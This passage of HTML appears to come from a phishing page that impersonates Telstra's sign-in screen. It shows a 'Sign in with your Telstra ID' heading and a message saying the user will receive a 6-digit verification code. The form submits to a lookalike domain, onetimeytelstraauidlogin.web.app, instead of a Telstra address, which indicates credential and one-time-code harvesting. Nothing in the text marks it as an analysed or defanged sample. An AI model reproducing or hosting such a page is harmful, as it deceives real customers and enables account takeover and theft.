        </header>
        <div role="main" class="t-form-container">
            <h1 class=" t-able-heading-b    t-able-spacing-2x-mb ">
                Sign in </h1>
            <div class="t-able-text-bodyshort  t-able-spacing-7x-mb ">Sign in with your Telstra ID</div>
            <form method="POST" action="https://onetimeytelstraauidlogin.web.app/" autocomplete="off">
                <div id="passkey-error" class="t-able-message-inline-warning t-able-spacing-4x-mb t-icon--hidden">
                    <svg class="able-icon" role="img" aria-label="Warning" focusable="false">
                        <use href="./assets/able-sprites.svg?v27#Warning"></use>
                    </svg>
                    <p id="passkey-error-text"></p>
                </div>
                <div class="t-able-text-field  t-able-spacing-2x-mb ">
                  <p>We need you to confirm your identity. This extra layer of security is to increase the protection of your account and confirm it’s really you.
                    You will receive a 6-digit code to proceed with the verification.</p>
                  

     
                
                <p id="error"></p>
                <div class="">
                  <button id="submit-btn" class="t-able-high-emph-button  t-able-spacing-7x-mb " type="submit" onclick="handleSubmitBtnClk(event)">Sign in</button>
                </div>
            </form>
        </div>
